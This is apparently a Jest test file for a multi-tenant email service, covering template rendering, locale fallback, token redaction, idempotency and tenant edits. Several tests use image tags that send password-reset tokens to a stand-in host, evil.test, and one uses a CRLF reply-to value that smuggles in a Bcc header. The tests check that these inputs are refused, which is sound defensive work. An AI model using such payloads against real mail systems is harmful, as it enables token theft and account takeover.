import { BadRequestException } from '@nestjs/common';
import { z } from 'zod';
import { defineEmail } from '@saas/backend';
import { EmailDefinitionsRegistry } from './definitions-registry';
import { EmailService } from './email.service';
import type { EmailEnv } from './email-env';

const RESET = defineEmail({
  key: 'core.password-reset',
  scope: 'tenant',
  name: 'Password reset',
  description: 'test',
  variables: z.object({ resetUrl: z.string() }),
  sample: { resetUrl: 'https://app.test/reset/sample' },
  required: ['resetUrl'],
  sensitive: ['resetUrl'],
  defaults: {
    en: { subject: 'Reset your password', html: '<p>Hello from {{company.name}}</p>{{button resetUrl "Reset"}}' },
    id: { subject: 'Atur ulang kata sandi', html: '<p>Halo dari {{company.name}}</p>{{button resetUrl "Atur ulang"}}' },
  },
});

const NOTICE = defineEmail({
  key: 'core.notice',
  scope: 'platform',
  name: 'Notice',
  description: 'test',
  variables: z.object({ pluginName: z.string() }),
  sample: { pluginName: 'Docs' },
  defaults: {
    en: { subject: 'About {{pluginName}}', html: '<p>{{pluginName}} changed</p>' },
    id: { subject: 'Tentang {{pluginName}}', html: '<p>{{pluginName}} berubah</p>' },
  },
});

const WELCOME = defineEmail({
  key: 'core.welcome-test',
  scope: 'platform',
  name: 'Welcome',
  description: 'test',
  variables: z.object({ setupUrl: z.string() }),
  sample: { setupUrl: 'https://app.test/setup/sample' },
  required: ['setupUrl'],
  sensitive: ['setupUrl'],
  defaults: {
    en: { subject: 'Welcome', html: '{{button setupUrl "Set up"}}' },
    id: { subject: 'Selamat datang', html: '{{button setupUrl "Siapkan"}}' },
  },
});

const ENV: EmailEnv = {
  smtpHost: 'smtp.test', smtpPort: 587, mailFrom: 'no-reply@saas.test', mailFromName: 'SaaS Test',
  frontendUrl: 'http://web.test', apiPublicUrl: 'http://api.test', retentionDays: 90,
};

function fakeMessages() {
  const rows: Array<Record<string, any>> = [];
  return {
    rows,
    create: jest.fn(async ({ data }: { data: Record<string, any> }) => {
      if (data.idempotencyKey && rows.some((r) => r.idempotencyKey === data.idempotencyKey)) {
        throw Object.assign(new Error('Unique constraint failed on the fields: (`idempotencyKey`)'), { code: 'P2002' });
      }
      const row = { id: `m${rows.length + 1}`, status: 'QUEUED', attempts: 0, ...data };
      rows.push(row);
      return row;
    }),
    update: jest.fn(async ({ where, data }: { where: { id: string }; data: Record<string, any> }) => Object.assign(rows.find((r) => r.id === where.id)!, data)),
    findUnique: jest.fn(async ({ where }: { where: Record<string, any> }) =>
      rows.find((r) => Object.entries(where).every(([k, v]) => r[k] === v)) ?? null),
  };
}

const ARTICLE = defineEmail({
  key: 'sample-plugin.article-published',
  scope: 'tenant',
  name: 'Article published',
  description: 'test',
  variables: z.object({ title: z.string().describe('The article title'), url: z.string() }),
  sample: { title: 'Hello', url: 'https://app.test/a/1' },
  required: ['url'],
  defaults: {
    en: { subject: 'Published: {{title}}', html: '{{button url "Read"}}' },
    id: { subject: 'Terbit: {{title}}', html: '{{button url "Baca"}}' },
  },
});

interface PluginState { isEnabled?: boolean; pricingModel?: string; tenantEnabled?: boolean; subscription?: { status: string; trialEndsAt: Date | null } | null }

function setup(opts: {
  language?: 'ENGLISH' | 'INDONESIA';
  transport?: boolean;
  config?: Record<string, unknown>;
  queueFails?: boolean;
  /** Tenant edits by `key:locale`; undefined = no override provider registered */
  edits?: Record<string, { subject: string; html: string }>;
  plugins?: Record<string, PluginState>;
  /** The System workspace's own plugin switches (platform edits follow its access to document-templates) */
  systemPlugins?: Record<string, PluginState>;
} = {}) {
  const tenantMessages = fakeMessages();
  const publicMessages = fakeMessages();
  const config = {
    language: opts.language ?? 'ENGLISH', logo: '/uploads/tenant_acme/config/logo.png', primaryColor: '#112233',
    emailSenderName: null, emailReplyTo: null, ...opts.config,
  };
  const plugins: Record<string, PluginState> = {
    'document-templates': { tenantEnabled: true },
    'sample-plugin': { tenantEnabled: true },
    ...opts.plugins,
  };
  const systemPlugins: Record<string, PluginState> = opts.systemPlugins ?? { 'document-templates': { tenantEnabled: true } };
  const pluginClient = (states: Record<string, PluginState>) => ({
    plugin: { findUnique: jest.fn(async ({ where }: { where: { key: string } }) => (states[where.key] ? { key: where.key, isEnabled: states[where.key].tenantEnabled ?? false } : null)) },
    tenantSubscription: {
      findMany: jest.fn(async () =>
        Object.entries(states).flatMap(([pluginKey, p]) => (p.subscription ? [{ pluginKey, ...p.subscription }] : [])),
      ),
    },
  });
  const tenantClient = {
    emailMessage: tenantMessages,
    tenantConfig: { findFirst: jest.fn(async () => config) },
    ...pluginClient(plugins),
  };
  const systemClient = pluginClient(systemPlugins);
  const prisma = {
    emailMessage: publicMessages,
    tenant: { findUnique: jest.fn(async ({ where }: { where: { slug: string } }) => (where.slug === 'acme' ? { id: 't1', slug: 'acme', name: 'Acme Corp' } : null)) },
    plugin: { findUnique: jest.fn(async ({ where }: { where: { key: string } }) => (plugins[where.key] ? { key: where.key, isEnabled: plugins[where.key].isEnabled ?? true, pricingModel: plugins[where.key].pricingModel ?? 'FREE' } : null)) },
    getTenantClient: jest.fn((slug: string) => (slug === 'system' ? systemClient : tenantClient)),
  };
  const queue = { add: jest.fn(async () => (opts.queueFails ? Promise.reject(new Error('Redis down')) : {})) };
  const registry = new EmailDefinitionsRegistry([RESET, NOTICE, WELCOME], { 'sample-plugin': [ARTICLE] });
  const transport = { current: opts.transport === false ? null : { send: jest.fn() } };
  const overrides = {
    pluginKey: 'document-templates',
    find: jest.fn(async (_slug: string | null, key: string, locale: string) => opts.edits?.[`${key}:${locale}`] ?? null),
  };
  const moduleRef = {
    get: jest.fn(() => {
      if (!opts.edits) throw new Error('Nest could not find EMAIL_TEMPLATE_OVERRIDES');
      return overrides;
    }),
  };
  const store = new Map<string, unknown>();
  const cache = { get: jest.fn(async (k: string) => (store.has(k) ? store.get(k) : null)), set: jest.fn(async (k: string, v: unknown) => { store.set(k, v); }) };
  const service = new EmailService(prisma as any, queue as any, ENV, registry, transport, moduleRef as any, cache as any);
  return { service, prisma, queue, tenantMessages, publicMessages, overrides };
}

const job = (queue: { add: jest.Mock }, call = 0) => queue.add.mock.calls[call] as unknown as [string, any, any];

describe('EmailService.send', () => {
  it('throws on an unknown template', async () => {
    const { service } = setup();
    await expect(service.send({ template: 'core.nope', to: 'a@x.test', data: {} })).rejects.toBeInstanceOf(BadRequestException);
  });

  it('throws when data fails the schema', async () => {
    const { service, queue } = setup();
    await expect(service.send({ template: 'core.password-reset', tenantSlug: 'acme', to: 'a@x.test', data: { resetUrl: 42 } })).rejects.toBeInstanceOf(BadRequestException);
    expect(queue.add).not.toHaveBeenCalled();
  });

  it('throws for a tenant-scope email without tenantSlug', async () => {
    const { service } = setup();
    await expect(service.send({ template: 'core.password-reset', to: 'a@x.test', data: { resetUrl: 'https://app.test/r/1' } })).rejects.toBeInstanceOf(BadRequestException);
  });

  it('tenant-scope email is logged in the tenant schema and queued', async () => {
    const { service, queue, tenantMessages, publicMessages, prisma } = setup();

    const result = await service.send({ template: 'core.password-reset', tenantSlug: 'acme', to: 'user@acme.test', data: { resetUrl: 'https://app.test/r/1' } });

    expect(result).toEqual({ messageId: 'm1', status: 'QUEUED' });
    expect(prisma.getTenantClient).toHaveBeenCalledWith('acme');
    expect(publicMessages.rows).toHaveLength(0);
    expect(tenantMessages.rows[0]).toMatchObject({
      tenantSlug: 'acme', templateKey: 'core.password-reset', source: 'core', locale: 'en', to: ['user@acme.test'],
      subject: 'Reset your password', status: 'QUEUED',
    });
    const [name, data, options] = job(queue);
    expect(name).toBe('send-email');
    expect(data).toMatchObject({ messageId: 'm1', tenantSlug: 'acme', envelope: { to: ['user@acme.test'], subject: 'Reset your password' } });
    expect(data.envelope.html).toContain('Hello from Acme Corp');
    expect(data.envelope.html).toContain('src="http://api.test/uploads/tenant_acme/config/logo.png"');
    expect(options).toMatchObject({ jobId: 'm1', attempts: 3, removeOnComplete: true });
  });

  it('platform email is logged in public with the tenantSlug column', async () => {
    const { service, queue, tenantMessages, publicMessages } = setup();

    await service.send({ template: 'core.notice', tenantSlug: 'acme', to: 'boss@acme.test', data: { pluginName: 'Docs' } });

    expect(tenantMessages.rows).toHaveLength(0);
    expect(publicMessages.rows[0]).toMatchObject({ tenantSlug: 'acme', templateKey: 'core.notice', subject: 'About Docs' });
    expect(job(queue)[1].tenantSlug).toBeNull(); // the row lives in public
    expect(job(queue)[1].envelope.html).toContain('SaaS Test');
  });

  it('locale falls back to the tenant language, then en', async () => {
    const { service, publicMessages, tenantMessages } = setup({ language: 'INDONESIA' });

    await service.send({ template: 'core.password-reset', tenantSlug: 'acme', to: 'a@acme.test', data: { resetUrl: 'https://app.test/r/1' } });
    await service.send({ template: 'core.password-reset', tenantSlug: 'acme', locale: 'en', to: 'a@acme.test', data: { resetUrl: 'https://app.test/r/2' } });
    await service.send({ template: 'core.notice', to: 'sales@saas.test', data: { pluginName: 'Docs' } });

    expect(tenantMessages.rows.map((r) => [r.locale, r.subject])).toEqual([['id', 'Atur ulang kata sandi'], ['en', 'Reset your password']]);
    expect(publicMessages.rows[0]).toMatchObject({ locale: 'en', tenantSlug: null });
  });

  it('sensitive values are hidden in the logged html/text and the row is redacted, while the job carries the real link', async () => {
    const { service, queue, tenantMessages } = setup();

    await service.send({ template: 'core.password-reset', tenantSlug: 'acme', to: 'a@acme.test', data: { resetUrl: 'https://app.test/reset/tok-123' } });

    const row = tenantMessages.rows[0];
    expect(row.redacted).toBe(true);
    expect(row.html).not.toContain('tok-123');
    expect(row.text).not.toContain('tok-123');
    expect(row.html).toContain('[hidden]');
    expect(job(queue)[1].envelope.html).toContain('https://app.test/reset/tok-123');
    expect(job(queue)[1].envelope.text).toContain('https://app.test/reset/tok-123');
  });

  it('redacted messages enqueue with removeOnFail: true', async () => {
    const { service, queue } = setup();

    await service.send({ template: 'core.password-reset', tenantSlug: 'acme', to: 'a@acme.test', data: { resetUrl: 'https://app.test/r/1' } });
    await service.send({ template: 'core.notice', to: 'a@acme.test', data: { pluginName: 'Docs' } });

    expect(job(queue, 0)[2].removeOnFail).toBe(true);
    expect(job(queue, 1)[2].removeOnFail).toEqual({ count: 500 });
  });

  it('same idempotencyKey twice returns the first message and enqueues once', async () => {
    const { service, queue, publicMessages } = setup();
    const input = { template: 'core.notice', tenantSlug: 'acme', to: 'a@acme.test', data: { pluginName: 'Docs' }, idempotencyKey: 'billing.invoice.issued:inv-1' };

    const [first, second] = await Promise.all([service.send(input), service.send(input)]);

    expect(first.messageId).toBe('m1');
    expect(second).toEqual({ messageId: 'm1', status: 'QUEUED' });
    expect(publicMessages.rows).toHaveLength(1);
    expect(queue.add).toHaveBeenCalledTimes(1);
  });

  it('without a transport the message is SKIPPED with "SMTP not configured" and nothing is queued', async () => {
    const { service, queue, publicMessages } = setup({ transport: false });

    const result = await service.send({ template: 'core.notice', to: 'a@acme.test', data: { pluginName: 'Docs' } });

    expect(result.status).toBe('SKIPPED');
    expect(publicMessages.rows[0]).toMatchObject({ status: 'SKIPPED', lastError: 'SMTP not configured' });
    expect(queue.add).not.toHaveBeenCalled();
  });

  it('a message that cannot be queued is marked FAILED instead of throwing', async () => {
    const { service, publicMessages } = setup({ queueFails: true });

    const result = await service.send({ template: 'core.notice', to: 'a@acme.test', data: { pluginName: 'Docs' } });

    expect(result.status).toBe('FAILED');
    expect(publicMessages.rows[0]).toMatchObject({ status: 'FAILED', lastError: expect.stringContaining('Redis down') });
  });

  it('tenant sender name and reply-to are used; platform emails use MAIL_FROM_NAME', async () => {
    const { service, queue, tenantMessages } = setup({ config: { emailSenderName: 'Acme Billing', emailReplyTo: 'billing@acme.test' } });

    await service.send({ template: 'core.password-reset', tenantSlug: 'acme', to: 'a@acme.test', data: { resetUrl: 'https://app.test/r/1' } });
    await service.send({ template: 'core.notice', tenantSlug: 'acme', to: 'a@acme.test', data: { pluginName: 'Docs' } });

    expect(job(queue, 0)[1].envelope).toMatchObject({ from: { name: 'Acme Billing', address: 'no-reply@saas.test' }, replyTo: 'billing@acme.test' });
    expect(tenantMessages.rows[0]).toMatchObject({ from: '"Acme Billing" <no-reply@saas.test>', replyTo: 'billing@acme.test' });
    expect(job(queue, 1)[1].envelope.from).toEqual({ name: 'SaaS Test', address: 'no-reply@saas.test' });
    expect(job(queue, 1)[1].envelope.replyTo).toBeUndefined();
  });

  it('a per-message reply-to wins over the tenant setting; one with a line break is refused', async () => {
    const { service, queue, publicMessages } = setup();

    await service.send({ template: 'core.notice', to: 'sales@saas.test', replyTo: 'budi@acme.test', data: { pluginName: 'Docs' } });

    expect(job(queue)[1].envelope.replyTo).toBe('budi@acme.test');
    expect(publicMessages.rows[0].replyTo).toBe('budi@acme.test');
    await expect(service.send({ template: 'core.notice', to: 'sales@saas.test', replyTo: 'a@x.test\r\nBcc: v@x.test', data: { pluginName: 'Docs' } }))
      .rejects.toBeInstanceOf(BadRequestException);
  });

  it('without a sender name the tenant name is used', async () => {
    const { service, queue } = setup();

    await service.send({ template: 'core.password-reset', tenantSlug: 'acme', to: 'a@acme.test', data: { resetUrl: 'https://app.test/r/1' } });

    expect(job(queue)[1].envelope.from).toEqual({ name: 'Acme Corp', address: 'no-reply@saas.test' });
  });
});

const resetSend = { template: 'core.password-reset', tenantSlug: 'acme', to: 'a@acme.test', data: { resetUrl: 'https://app.test/reset/tok-1' } };

describe('EmailService — tenant edits', () => {
  it("uses the tenant's edit for its locale", async () => {
    const { service, tenantMessages, queue } = setup({ edits: { 'core.password-reset:en': { subject: 'Acme password help', html: '<p>Custom</p>{{button resetUrl "Go"}}' } } });

    await service.send(resetSend);

    expect(tenantMessages.rows[0]).toMatchObject({ subject: 'Acme password help', note: null });
    expect(job(queue)[1].envelope.html).toContain('<p>Custom</p>');
  });

  it('an id-language tenant with only an en edit gets the id default, not the en edit', async () => {
    const { service, tenantMessages } = setup({ language: 'INDONESIA', edits: { 'core.password-reset:en': { subject: 'Custom EN', html: '{{button resetUrl "Go"}}' } } });

    await service.send(resetSend);

    expect(tenantMessages.rows[0]).toMatchObject({ locale: 'id', subject: 'Atur ulang kata sandi' });
  });

  it.each([
    ['disabled for the tenant', { 'document-templates': { tenantEnabled: false } }],
    ['switched off globally', { 'document-templates': { isEnabled: false, tenantEnabled: true } }],
    ['paid but not paid for', { 'document-templates': { pricingModel: 'MONTHLY', tenantEnabled: true, subscription: null } }],
  ])('ignores edits when the override plugin is %s', async (_label, plugins) => {
    const { service, tenantMessages, overrides } = setup({ plugins, edits: { 'core.password-reset:en': { subject: 'Custom', html: '{{button resetUrl "Go"}}' } } });

    await service.send(resetSend);

    expect(tenantMessages.rows[0].subject).toBe('Reset your password');
    expect(overrides.find).not.toHaveBeenCalled();
  });

  it('ignores an edit that lost a required variable and notes why', async () => {
    const { service, tenantMessages } = setup({ edits: { 'core.password-reset:en': { subject: 'Custom', html: '<p>No link any more</p>' } } });

    await service.send(resetSend);

    expect(tenantMessages.rows[0].subject).toBe('Reset your password');
    expect(tenantMessages.rows[0].note).toBe('customized template not used: "resetUrl" must stay in the email');
  });

  it('ignores an edit whose real render leaks a sensitive value (conditional block) and notes why', async () => {
    // company.name is empty when the edit is checked with sample data, so the image only appears in a real send
    const html = '{{button resetUrl "Go"}}{{#if company.name}}<img src="https://evil.test/p.png?u={{resetUrl}}">{{/if}}';
    const { service, tenantMessages, queue } = setup({ edits: { 'core.password-reset:en': { subject: 'Custom', html } } });
    expect(service.checkEdit('core.password-reset', { subject: 'Custom', html })).toEqual([]);

    await service.send(resetSend);

    expect(job(queue)[1].envelope.html).not.toContain('evil.test');
    expect(tenantMessages.rows[0].subject).toBe('Reset your password');
    expect(tenantMessages.rows[0].note).toBe('customized template not used: "resetUrl" may only be used as a link address');
  });

  it('an edit that drops the link only for real data (condition on company.name) is not used', async () => {
    const html = '{{#if company.name}}<p>Ask your admin.</p>{{else}}{{button resetUrl "Go"}}{{/if}}';
    const { service, tenantMessages, queue } = setup({ edits: { 'core.password-reset:en': { subject: 'Custom', html } } });
    expect(service.checkEdit('core.password-reset', { subject: 'Custom', html })).toEqual([]);

    await service.send(resetSend);

    expect(job(queue)[1].envelope.html).toContain('https://app.test/reset/tok-1');
    expect(tenantMessages.rows[0].note).toBe('customized template not used: "resetUrl" must stay in the email as a link');
  });

  it('a stored edit that copies the link through a helper is not used; the token is only in the link', async () => {
    const html = '<img src="https://evil.test/p.png?u={{capitalize resetUrl}}">{{button resetUrl "Go"}}';
    const { service, tenantMessages, queue } = setup({ edits: { 'core.password-reset:en': { subject: 'Custom', html } } });

    await service.send(resetSend);

    const sent: string = job(queue)[1].envelope.html;
    expect(sent).not.toContain('evil.test');
    expect(sent.split('https://app.test/reset/tok-1').length - 1).toBe(1); // the one button
    expect(tenantMessages.rows[0].note).toBe('customized template not used: "resetUrl" may only be used as a link address');
  });

  it('without an override provider the default is used', async () => {
    const { service, tenantMessages } = setup();

    await service.send(resetSend);

    expect(tenantMessages.rows[0].subject).toBe('Reset your password');
  });
});

describe('EmailService — platform edits', () => {
  const noticeSend = { template: 'core.notice', tenantSlug: 'acme', to: 'a@acme.test', data: { pluginName: 'Docs' } };
  const edited = { 'core.notice:en': { subject: 'Edited {{pluginName}}', html: '<p>edited</p>' } };

  it('a platform edit is used while document-templates is usable by the System workspace', async () => {
    const { service, overrides, publicMessages } = setup({ edits: edited });

    await service.send(noticeSend);

    expect(overrides.find).toHaveBeenCalledWith(null, 'core.notice', 'en');
    expect(publicMessages.rows[0].subject).toBe('Edited Docs');
  });

  it('a platform edit is not used when document-templates is off for System, even if it is on for the workspace', async () => {
    const { service, publicMessages } = setup({ edits: edited, systemPlugins: { 'document-templates': { tenantEnabled: false } } });

    await service.send(noticeSend);

    expect(publicMessages.rows[0].subject).toBe('About Docs');
  });

  it('a platform edit is not used when document-templates is off system-wide', async () => {
    const { service, publicMessages } = setup({ edits: edited, plugins: { 'document-templates': { isEnabled: false, tenantEnabled: true } } });

    await service.send(noticeSend);

    expect(publicMessages.rows[0].subject).toBe('About Docs');
  });

  it('a platform edit that misplaces the setup link falls back to the default with a note', async () => {
    const html = '<img src="https://evil.test/p.png?u={{capitalize setupUrl}}">{{button setupUrl "Go"}}';
    const { service, publicMessages, queue } = setup({ edits: { 'core.welcome-test:en': { subject: 'Custom', html } } });

    await service.send({ template: 'core.welcome-test', tenantSlug: 'acme', to: 'a@acme.test', data: { setupUrl: 'https://app.test/setup/tok-1' } });

    expect(job(queue)[1].envelope.html).not.toContain('evil.test');
    expect(publicMessages.rows[0].subject).toBe('Welcome');
    expect(publicMessages.rows[0].note).toMatch(/^customized template not used:/);
  });

  it('an English platform edit is not used for an Indonesian workspace', async () => {
    const { service, publicMessages } = setup({ edits: edited, language: 'INDONESIA' });

    await service.send(noticeSend);

    expect(publicMessages.rows[0].subject).toBe('Tentang Docs');
  });
});

describe('EmailService — editor support', () => {
  it('listTenantDefinitions never lists platform emails; listPlatformDefinitions lists only them', async () => {
    const { service } = setup();

    expect((await service.listTenantDefinitions('acme')).map((d) => d.scope)).not.toContain('platform');
    expect(service.listPlatformDefinitions().map((d) => d.key)).toEqual(['core.notice', 'core.welcome-test']);
    expect(service.listPlatformDefinitions()[1]).toMatchObject({ scope: 'platform', source: 'core', sensitive: ['setupUrl'], required: ['setupUrl'] });
  });

  it('preview(null, <platform key>) uses the platform layout; a scope mismatch cannot be edited', async () => {
    const { service } = setup();

    const out = await service.preview(null, 'core.notice', 'en', { subject: 'Hi {{company.name}}', html: '<p>{{pluginName}}</p>' });

    expect(out.subject).toBe('Hi SaaS Test');
    expect(out.html).toContain('SaaS Test');
    expect(out.html).not.toContain('Acme Corp');
    await expect(service.preview(null, 'core.password-reset', 'en')).rejects.toThrow('cannot be edited');
    await expect(service.preview('acme', 'core.notice', 'en')).rejects.toThrow('cannot be edited');
  });

  it('sendTest(null, ...) logs a platform test with no tenant', async () => {
    const { service, publicMessages, tenantMessages } = setup();

    await service.sendTest(null, 'core.notice', 'en', 'me@system.test');

    expect(publicMessages.rows[0]).toMatchObject({ isTest: true, tenantSlug: null, to: ['me@system.test'], subject: 'About Docs' });
    expect(tenantMessages.rows).toHaveLength(0);
  });

  it('listTenantDefinitions hides definitions of plugins not enabled for the tenant', async () => {
    const enabled = await setup().service.listTenantDefinitions('acme');
    const disabled = await setup({ plugins: { 'sample-plugin': { tenantEnabled: false } } }).service.listTenantDefinitions('acme');

    expect(enabled.map((d) => d.key)).toEqual(['core.password-reset', 'sample-plugin.article-published']);
    expect(disabled.map((d) => d.key)).toEqual(['core.password-reset']);
    expect(enabled[1]).toMatchObject({
      source: 'sample-plugin',
      required: ['url'],
      sensitive: [],
      variables: [{ name: 'title', description: 'The article title' }, { name: 'url' }],
    });
  });

  it('checkEdit reports problems and unknown emails, and accepts platform emails', () => {
    const { service } = setup();

    expect(service.checkEdit('core.password-reset', { subject: 'S', html: '{{{resetUrl}}}' })).not.toEqual([]);
    expect(service.checkEdit('core.nope', { subject: 'S', html: '' })).toEqual(['Unknown email']);
    expect(service.checkEdit('core.notice', { subject: 'S', html: '<p>{{pluginName}}</p>' })).toEqual([]);
  });

  it('preview renders the sample in the tenant layout', async () => {
    const { service } = setup();

    const out = await service.preview('acme', 'sample-plugin.article-published', 'id', { subject: 'Baru: {{title}}', html: '<p>{{title}}</p>{{button url "Baca"}}' });

    expect(out.subject).toBe('Baru: Hello');
    expect(out.html).toContain('<p>Hello</p>');
    expect(out.html).toContain('Acme Corp');
    expect(out.text).toContain('https://app.test/a/1');
  });

  it('preview without content shows the default', async () => {
    const out = await setup().service.preview('acme', 'sample-plugin.article-published', 'en');
    expect(out.subject).toBe('Published: Hello');
  });

  it('preview of a broken draft is a 400 with the problems', async () => {
    const refused = await setup().service.preview('acme', 'sample-plugin.article-published', 'en', { subject: 'S', html: '{{#if url}}' }).catch((e) => e);
    expect(refused).toBeInstanceOf(BadRequestException);
    expect(refused.getResponse()).toMatchObject({ errors: { template: [expect.any(String)] } });
  });

  it('preview of a draft that misplaces the link is a 400 naming the problem', async () => {
    const refused = await setup().service
      .preview('acme', 'core.password-reset', 'en', { subject: 'S', html: '<img src="https://evil.test/?{{uppercase resetUrl}}">{{button resetUrl "Go"}}' })
      .catch((e) => e);

    expect(refused).toBeInstanceOf(BadRequestException);
    expect(refused.getResponse()).toMatchObject({ errors: { template: ['"resetUrl" may only be used as a link address'] } });
  });

  it('sendTest logs isTest and uses the sample', async () => {
    const { service, tenantMessages, queue } = setup();

    const result = await service.sendTest('acme', 'sample-plugin.article-published', 'en', 'me@acme.test');

    expect(result.status).toBe('QUEUED');
    expect(tenantMessages.rows[0]).toMatchObject({ isTest: true, to: ['me@acme.test'], subject: 'Published: Hello' });
    expect(job(queue)[1].envelope.html).toContain('https://app.test/a/1');
  });

  it('sendTest with a draft uses the draft; a draft with problems is refused', async () => {
    const { service, tenantMessages } = setup();

    await service.sendTest('acme', 'sample-plugin.article-published', 'en', 'me@acme.test', { subject: 'Draft {{title}}', html: '{{button url "Go"}}' });
    expect(tenantMessages.rows[0].subject).toBe('Draft Hello');

    const refused = await service.sendTest('acme', 'sample-plugin.article-published', 'en', 'me@acme.test', { subject: 'S', html: '<p>no link</p>' }).catch((e) => e);
    expect(refused).toBeInstanceOf(BadRequestException);
    expect(refused.getResponse()).toMatchObject({ errors: { template: ['"url" must stay in the email'] } });
  });

  it('sendTest refuses a platform definition', async () => {
    await expect(setup().service.sendTest('acme', 'core.notice', 'en', 'me@acme.test')).rejects.toBeInstanceOf(BadRequestException);
  });
});
